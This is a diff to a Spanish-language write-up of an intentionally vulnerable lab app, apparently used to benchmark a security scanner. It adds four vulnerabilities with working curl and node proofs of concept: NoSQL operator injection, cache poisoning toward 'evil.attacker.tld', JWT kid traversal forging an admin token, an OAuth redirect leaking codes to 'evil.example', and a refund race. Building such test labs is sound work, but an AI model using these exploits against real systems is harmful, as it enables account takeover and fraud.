@@ -664,6 +664,98 @@ reflexión inmediata en su propia respuesta no observa.
 
 ---
 
+# Set extendido (v1.5) — vulnerabilidades 20–23
+
+Requieren sesión autenticada (`sid` de `alice@meridian.io`). Los PoCs asumen el lab en
+`http://localhost:3000` y una cookie en `cj.txt`
+(`curl -c cj.txt -b cj.txt -X POST /api/auth/login -d '{"email":"alice@meridian.io","password":"Password123!"}'`).
+
+## 20 · Inyección de operadores estilo NoSQL (rompe el scope por owner)
+
+`POST /api/search/invoices` acepta un filtro tipo Mongo (`$ne`, `$gt`, `$lt`, `$like`, `$or`)
+traducido a SQL. El endpoint **cree** que restringe al usuario (`owner_email` del caller), pero
+el filtro del cliente se fusiona por encima y puede **reabrir** el scope.
+
+```bash
+# Devuelve invoices de OTROS tenants (bob, admin), memos confidenciales incluidos:
+curl -s -c cj.txt -b cj.txt -X POST http://localhost:3000/api/search/invoices \
+  -H 'Content-Type: application/json' \
+  -d '{"filter":{"owner_email":{"$ne":"__none__"}}}'
+# $ne convierte "owner_email = alice" en "owner_email <> __none__" -> todos.
+# Variante SQLi: una comilla en un valor rompe el literal.
+```
+
+Despista al escáner: el caso base (`{"filter":{"status":"paid"}}`) responde 200 normal; el abuso
+está en la **forma** del objeto, no en un valor obviamente malicioso.
+
+## 21 · Web cache poisoning (input no-keyed: `X-Forwarded-Host`)
+
+`GET /api/status/summary` cachea con clave = **solo el path**, pero el cuerpo embebe
+`portal_url`/`assets_base` construidos desde `X-Forwarded-Host` (no-keyed). Quien puebla la cache
+primero controla el host servido al resto (incluida la sesión del admin).
+
+```bash
+# (1) Envenena la cache con un host hostil:
+curl -s -c cj.txt -b cj.txt -H 'X-Forwarded-Host: evil.attacker.tld' \
+  http://localhost:3000/api/status/summary
+# (2) Otra víctima pide lo mismo SIN el header y recibe el payload envenenado (X-Cache: HIT):
+curl -s -c cj.txt -b cj.txt http://localhost:3000/api/status/summary
+# -> "portal_url":"https://evil.attacker.tld/"
+```
+
+Despista al escáner: hace falta **dos** peticiones correlacionadas (envenenar → víctima) y
+entender qué input entra al cuerpo sin formar parte de la clave de cache.
+
+## 22 · JWT `kid` path traversal + OAuth open redirect
+
+**(a) `kid` path traversal → forja de token admin.** El verificador HS256, si el header trae
+`kid`, lee la clave HMAC de disco desde una ruta **sin sanear**. Apuntando `kid` a un fichero de
+contenido conocido (`/dev/null` → secreto vacío) puedes firmar un token válido.
+
+```bash
+TOKEN=$(node -e '
+const c=require("crypto");
+const b=o=>Buffer.from(JSON.stringify(o)).toString("base64url");
+const h=b({alg:"HS256",typ:"JWT",kid:"../../../../../../../dev/null"});
+const p=b({sub:"alice@meridian.io",role:"admin",iat:1});
+const s=c.createHmac("sha256",Buffer.alloc(0)).update(h+"."+p).digest("base64url");
+console.log(h+"."+p+"."+s);')
+curl -s -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/v2/admin   # -> 200, lista usuarios
+```
+
+**(b) OAuth open redirect.** `GET /api/auth/authorize` no valida `redirect_uri` contra una
+allow-list por `client_id`: acepta cualquier URL absoluta y hace 302 con el `code`.
+
+```bash
+curl -s -i -c cj.txt -b cj.txt \
+  'http://localhost:3000/api/auth/authorize?client_id=meridian-mobile&redirect_uri=https://evil.example/cb&state=xyz' \
+  | grep -i location
+# -> Location: https://evil.example/cb?code=ac_...&state=xyz
+```
+
+## 23 · Refund double-spend (lógica de negocio + race fino)
+
+`POST /api/billing/refund` lee el estado del cargo, hace un round-trip async al "proveedor de
+refunds", y **solo después** marca el cargo como `refunded`. N refunds concurrentes pasan todos
+el check de `pending` antes de que ninguno lo cambie → el mismo cargo se paga N veces. Además el
+`/charge` es solo intención declarada (nunca debita), así que el refund provisiona saldo real por
+un cobro que no ocurrió.
+
+```bash
+curl -s -c cj.txt -b cj.txt http://localhost:3000/api/wallet    # saldo antes
+curl -s -c cj.txt -b cj.txt -X POST http://localhost:3000/api/billing/charge \
+  -H 'Content-Type: application/json' -d '{"amount":1000}'
+for i in $(seq 10); do
+  curl -s -c cj.txt -b cj.txt -X POST http://localhost:3000/api/billing/refund &
+done; wait
+curl -s -c cj.txt -b cj.txt http://localhost:3000/api/wallet    # -> saldo +~10000 por 1 cargo
+```
+
+Despista al escáner: cada request es individualmente válida; el fallo es una invariante económica
+que solo se rompe bajo concurrencia y correlacionando charge→refund→balance.
+
+---
+
 ## Resumen para el escáner
 
 | # | Clase | Señal ausente que despista al escáner |
@@ -687,5 +779,10 @@ reflexión inmediata en su propia respuesta no observa.
 | 17 | Session fixation | Login normal 200; requiere comparar el `sid` antes/después |
 | 18 | SQLi de segundo orden | Fuente parece segura; detona en un endpoint distinto (correlación fuente→sink) |
 | 19 | XSS almacenado ciego | Sin reflexión inmediata; ejecuta en la sesión del admin, en otro momento |
+| 20 | NoSQL operator injection | Caso base 200 normal; el abuso está en la forma del filtro, no en un valor |
+| 21 | Web cache poisoning | Input no-keyed; requiere 2 peticiones correlacionadas (envenenar→víctima) |
+| 22 | JWT `kid` traversal / OAuth open redirect | `kid` carga clave de disco; `redirect_uri` sin allow-list |
+| 23 | Refund double-spend | Cada request válida; invariante económica rota bajo concurrencia |
 
-Los 19 vectores fueron validados end-to-end contra la aplicación en ejecución.
+Los 23 vectores (19 originales + 4 del set extendido v1.5) fueron validados end-to-end contra la
+aplicación en ejecución mediante `tools/coverage.js` (resultado: **23/23 verificadas**).
